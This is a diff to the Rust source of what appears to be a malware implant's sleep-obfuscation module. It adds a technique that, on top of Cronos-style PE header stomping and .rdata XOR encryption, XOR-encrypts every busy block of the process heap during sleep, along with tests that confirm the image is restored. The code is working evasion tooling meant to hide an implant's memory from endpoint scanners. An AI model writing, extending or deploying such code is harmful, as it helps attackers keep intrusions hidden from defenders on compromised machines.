@@ -8,10 +8,11 @@
 //!
 //! # Technique identifiers
 //!
-//! | Value | Constant                 | Description                           |
-//! |-------|--------------------------|---------------------------------------|
-//! | 0     | [`SLEEP_TECHNIQUE_NONE`] | Plain sleep, no obfuscation           |
-//! | 1     | [`SLEEP_TECHNIQUE_CRONOS`] | Timer-callback PE stomp + XOR        |
+//! | Value | Constant                      | Description                                      |
+//! |-------|-------------------------------|--------------------------------------------------|
+//! | 0     | [`SLEEP_TECHNIQUE_NONE`]      | Plain sleep, no obfuscation                      |
+//! | 1     | [`SLEEP_TECHNIQUE_CRONOS`]    | Timer-callback PE stomp + XOR                    |
+//! | 2     | [`SLEEP_TECHNIQUE_HEAP_ENC`]  | Cronos + heap block XOR encryption at rest       |
 //!
 //! # Windows implementation notes
 //!
@@ -52,6 +53,26 @@ pub const SLEEP_TECHNIQUE_NONE: u32 = 0;
 /// falls back to a plain Tokio sleep.
 pub const SLEEP_TECHNIQUE_CRONOS: u32 = 1;
 
+/// Technique identifier: Cronos obfuscation **plus** heap encryption at rest.
+///
+/// On Windows: performs all steps of [`SLEEP_TECHNIQUE_CRONOS`] and
+/// additionally XOR-encrypts the contents of every allocated block in the
+/// default process heap for the duration of the sleep window.  The heap key
+/// is generated fresh each sleep cycle and is independent of the `.rdata`
+/// key.
+///
+/// # Safety note
+///
+/// Heap encryption corrupts in-flight allocations for any thread that
+/// accesses heap memory during the sleep window.  This technique is only
+/// safe when the agent is the sole active thread (or when all other threads
+/// have been suspended before the sleep begins).  In a multi-threaded
+/// runtime (e.g. a full Tokio executor) use this technique only if you
+/// understand the consequences.
+///
+/// On non-Windows builds falls back to a plain Tokio sleep.
+pub const SLEEP_TECHNIQUE_HEAP_ENC: u32 = 2;
+
 /// Perform an optionally obfuscated sleep.
 ///
 /// When `technique` is [`SLEEP_TECHNIQUE_CRONOS`] on Windows, timer-queue
@@ -70,9 +91,10 @@ pub async fn obfuscated_sleep(duration_ms: u64, technique: u32) {
     }
 
     #[cfg(windows)]
-    if technique == SLEEP_TECHNIQUE_CRONOS {
+    if technique == SLEEP_TECHNIQUE_CRONOS || technique == SLEEP_TECHNIQUE_HEAP_ENC {
         use tracing::warn;
-        match tokio::task::spawn_blocking(move || imp::cronos_sleep(duration_ms)).await {
+        let heap_enc = technique == SLEEP_TECHNIQUE_HEAP_ENC;
+        match tokio::task::spawn_blocking(move || imp::cronos_sleep(duration_ms, heap_enc)).await {
             Ok(Ok(())) => return,
             Ok(Err(e)) => {
                 warn!("sleep obfuscation failed ({e}); falling back to plain sleep");
@@ -108,10 +130,10 @@ mod imp {
     };
     use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
     use windows_sys::Win32::System::Memory::{
-        MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualProtect,
-        VirtualQuery,
+        GetProcessHeap, HeapLock, HeapUnlock, HeapWalk, MEMORY_BASIC_INFORMATION,
+        PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PROCESS_HEAP_ENTRY, VirtualProtect, VirtualQuery,
     };
-    use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
+    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, PROCESS_HEAP_ENTRY_BUSY};
     use windows_sys::Win32::System::Threading::{
         CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx, SetEvent,
         WAITORTIMERCALLBACK, WT_EXECUTEINTIMERTHREAD, WT_EXECUTEONLYONCE, WaitForSingleObject,
@@ -123,6 +145,24 @@ mod imp {
     const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
     /// Maximum bytes to back up from the PE header region (first 4 KB).
     const HEADER_BACKUP_SIZE: usize = 0x1000;
+    /// Maximum heap entries collected for heap encryption.
+    ///
+    /// Capped to bound stack usage: 512 × 16 bytes = 8 KiB overhead on the
+    /// blocking thread's stack frame.
+    const MAX_HEAP_ENTRIES: usize = 512;
+
+    /// A single heap block recorded before the sleep window begins.
+    ///
+    /// Stored in [`ObfContext`] so the timer callbacks can XOR the content
+    /// without calling `HeapWalk` again from the thread-pool context.
+    #[derive(Clone, Copy)]
+    struct HeapEntry {
+        /// Pointer to the start of the allocated block, stored as `usize`
+        /// to avoid raw-pointer `Send`/`Sync` concerns on the outer struct.
+        ptr: usize,
+        /// Usable size of the block in bytes (`cbData` from `PROCESS_HEAP_ENTRY`).
+        size: usize,
+    }
 
     /// Errors returned by the Windows Cronos sleep path.
     #[derive(Debug)]
@@ -188,8 +228,18 @@ mod imp {
         rdata_size: usize,
         /// Protection flags saved by the encrypt callback; 0 = not yet saved.
         old_rdata_protect: AtomicU32,
-        /// Random 32-byte XOR key, generated fresh each sleep cycle.
+        /// Random 32-byte XOR key for `.rdata` encryption, generated fresh each
+        /// sleep cycle.
         key: [u8; 32],
+        /// Pre-collected busy heap entries for heap encryption at rest.
+        ///
+        /// Populated by `collect_heap_entries()` in the main thread before
+        /// the timer queue is created.  Empty when heap encryption is disabled.
+        heap_entries: [HeapEntry; MAX_HEAP_ENTRIES],
+        /// Number of valid entries in `heap_entries` (0 ≤ n ≤ MAX_HEAP_ENTRIES).
+        heap_entry_count: usize,
+        /// Independent 32-byte XOR key used exclusively for heap block encryption.
+        heap_key: [u8; 32],
         /// Manual-reset event signalled by the decrypt callback on completion.
         done_event: HANDLE,
     }
@@ -251,6 +301,21 @@ mod imp {
                 }
             }
         }
+
+        // ── Heap blocks ───────────────────────────────────────────────────
+        // XOR-encrypt each pre-collected busy heap block.  The entry list
+        // lives in the stack-allocated ObfContext so it is unaffected by
+        // the encryption of the heap itself.
+        for i in 0..ctx.heap_entry_count {
+            let entry = &ctx.heap_entries[i];
+            if entry.size == 0 {
+                continue;
+            }
+            let slice = std::slice::from_raw_parts_mut(entry.ptr as *mut u8, entry.size);
+            for (j, byte) in slice.iter_mut().enumerate() {
+                *byte ^= ctx.heap_key[j % 32];
+            }
+        }
     }
 
     /// Timer callback #2 — executed by the thread pool at T = `duration_ms`.
@@ -265,6 +330,20 @@ mod imp {
     unsafe extern "system" fn decrypt_callback(param: *mut c_void, _fired_due_to_timeout: BOOLEAN) {
         // SAFETY: param is always a valid *mut ObfContext (see cronos_sleep).
         let ctx = &*(param as *const ObfContext);
+
+        // ── Heap blocks ───────────────────────────────────────────────────
+        // XOR is its own inverse — same operation decrypts.  Process heap
+        // entries first, before restoring .rdata, to mirror the encrypt order.
+        for i in 0..ctx.heap_entry_count {
+            let entry = &ctx.heap_entries[i];
+            if entry.size == 0 {
+                continue;
+            }
+            let slice = std::slice::from_raw_parts_mut(entry.ptr as *mut u8, entry.size);
+            for (j, byte) in slice.iter_mut().enumerate() {
+                *byte ^= ctx.heap_key[j % 32];
+            }
+        }
 
         // ── .rdata section ────────────────────────────────────────────────
         if ctx.rdata_size > 0 {
@@ -357,7 +436,57 @@ mod imp {
         (std::ptr::null_mut(), 0)
     }
 
-    /// Perform a Cronos-style obfuscated sleep.
+    /// Collect up to `MAX_HEAP_ENTRIES` busy allocated blocks from the default
+    /// process heap into the caller-supplied array.
+    ///
+    /// The heap is locked for the duration of the walk to prevent concurrent
+    /// modifications.  Returns the number of entries written.
+    ///
+    /// Silently stops collecting when the array is full; remaining busy blocks
+    /// beyond `MAX_HEAP_ENTRIES` are not encrypted.
+    ///
+    /// # Safety
+    ///
+    /// `entries` must point to at least `MAX_HEAP_ENTRIES` writable
+    /// `HeapEntry` slots.  The returned count indicates how many were filled.
+    unsafe fn collect_heap_entries(entries: &mut [HeapEntry; MAX_HEAP_ENTRIES]) -> usize {
+        let heap = GetProcessHeap();
+        if heap == 0 {
+            return 0;
+        }
+
+        // Lock the heap so the walk is consistent.
+        if HeapLock(heap) == FALSE {
+            return 0;
+        }
+
+        let mut count = 0usize;
+        let mut entry: PROCESS_HEAP_ENTRY = mem::zeroed();
+        entry.lpData = std::ptr::null_mut();
+
+        while HeapWalk(heap, &mut entry) != FALSE {
+            // Only collect busy (allocated) blocks — skip free blocks and
+            // region descriptors.
+            if u32::from(entry.wFlags) & PROCESS_HEAP_ENTRY_BUSY != 0 && entry.cbData > 0 {
+                if count < MAX_HEAP_ENTRIES {
+                    entries[count] =
+                        HeapEntry { ptr: entry.lpData as usize, size: entry.cbData as usize };
+                    count += 1;
+                } else {
+                    break; // array full — stop walking
+                }
+            }
+        }
+
+        HeapUnlock(heap);
+        count
+    }
+
+    /// Perform a Cronos-style obfuscated sleep, optionally with heap encryption.
+    ///
+    /// When `heap_enc` is `true`, busy heap blocks collected before the timers
+    /// start are XOR-encrypted for the duration of the sleep window and
+    /// decrypted on wakeup.
     ///
     /// Schedules two timer-queue callbacks — one to encrypt at T = 0 and one
     /// to decrypt at T = `duration_ms` — then parks the calling thread on a
@@ -367,7 +496,7 @@ mod imp {
     ///
     /// Returns a [`CronosError`] if any Windows API call fails.  The caller
     /// should fall back to a plain sleep on error.
-    pub fn cronos_sleep(duration_ms: u64) -> Result<(), CronosError> {
+    pub fn cronos_sleep(duration_ms: u64, heap_enc: bool) -> Result<(), CronosError> {
         // SAFETY: All Win32 calls follow their documented API contracts.
         // Pointer validity is maintained through the struct's lifetime, which
         // outlives both timer callbacks (enforced by DeleteTimerQueueEx with
@@ -414,7 +543,7 @@ mod imp {
                 return Err(CronosError::CreateEvent);
             }
 
-            // Random 32-byte XOR key — fresh each sleep cycle.
+            // Random 32-byte XOR key for .rdata — fresh each sleep cycle.
             let key: [u8; 32] = rand::random();
 
             // Back up the header region before creating timers.
@@ -423,6 +552,15 @@ mod imp {
             header_backup[..header_backup_len].copy_from_slice(src);
 
             let (rdata_ptr, rdata_size) = find_rdata_section(base_ptr as *const u8);
+
+            // Collect heap entries before creating timers when heap encryption
+            // is requested.  All entries are collected here in the main thread
+            // and stored in the stack-allocated context so the callbacks do not
+            // need to call HeapWalk from the thread-pool context.
+            let mut heap_entries = [HeapEntry { ptr: 0, size: 0 }; MAX_HEAP_ENTRIES];
+            let heap_entry_count =
+                if heap_enc { collect_heap_entries(&mut heap_entries) } else { 0 };
+            let heap_key: [u8; 32] = if heap_enc { rand::random() } else { [0u8; 32] };
 
             let mut ctx = ObfContext {
                 base_ptr,
@@ -433,6 +571,9 @@ mod imp {
                 rdata_size,
                 old_rdata_protect: AtomicU32::new(0),
                 key,
+                heap_entries,
+                heap_entry_count,
+                heap_key,
                 done_event,
             };
             let ctx_ptr = (&mut ctx as *mut ObfContext) as *mut c_void;
@@ -550,10 +691,56 @@ mod tests {
         assert!(ms >= 50, "unknown-technique sleep completed too early: {ms} ms");
     }
 
-    /// The two technique constants must be distinct.
+    /// All three technique constants must be distinct.
     #[test]
     fn technique_constants_are_distinct() {
         assert_ne!(SLEEP_TECHNIQUE_NONE, SLEEP_TECHNIQUE_CRONOS);
+        assert_ne!(SLEEP_TECHNIQUE_NONE, SLEEP_TECHNIQUE_HEAP_ENC);
+        assert_ne!(SLEEP_TECHNIQUE_CRONOS, SLEEP_TECHNIQUE_HEAP_ENC);
+    }
+
+    /// On non-Windows, [`SLEEP_TECHNIQUE_HEAP_ENC`] must fall back to plain
+    /// sleep and still respect the requested duration.
+    #[cfg(not(windows))]
+    #[tokio::test]
+    async fn heap_enc_falls_back_on_non_windows() {
+        let start = std::time::Instant::now();
+        obfuscated_sleep(50, SLEEP_TECHNIQUE_HEAP_ENC).await;
+        let ms = start.elapsed().as_millis();
+        assert!(ms >= 50, "HeapEnc fallback sleep completed too early: {ms} ms");
+    }
+
+    /// On Windows, [`SLEEP_TECHNIQUE_HEAP_ENC`] must sleep for the full
+    /// requested duration and restore the module image correctly.
+    #[cfg(windows)]
+    #[tokio::test]
+    async fn heap_enc_sleep_respects_duration_on_windows() {
+        let start = std::time::Instant::now();
+        obfuscated_sleep(100, SLEEP_TECHNIQUE_HEAP_ENC).await;
+        let ms = start.elapsed().as_millis();
+        assert!(ms >= 100, "HeapEnc sleep completed too early: {ms} ms");
+    }
+
+    /// Verify that the PE image is intact after a heap-enc sleep on Windows.
+    #[cfg(windows)]
+    #[tokio::test]
+    async fn heap_enc_sleep_restores_pe_headers() {
+        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
+
+        let magic_before = unsafe {
+            let base = GetModuleHandleW(std::ptr::null()) as *const u8;
+            [*base, *base.add(1)]
+        };
+
+        obfuscated_sleep(50, SLEEP_TECHNIQUE_HEAP_ENC).await;
+
+        let magic_after = unsafe {
+            let base = GetModuleHandleW(std::ptr::null()) as *const u8;
+            [*base, *base.add(1)]
+        };
+
+        assert_eq!(magic_before, magic_after, "PE MZ magic was not restored after HeapEnc sleep");
+        assert_eq!(magic_after, [b'M', b'Z'], "MZ magic does not match expected value");
     }
 
     /// On non-Windows, [`SLEEP_TECHNIQUE_CRONOS`] must fall back to plain
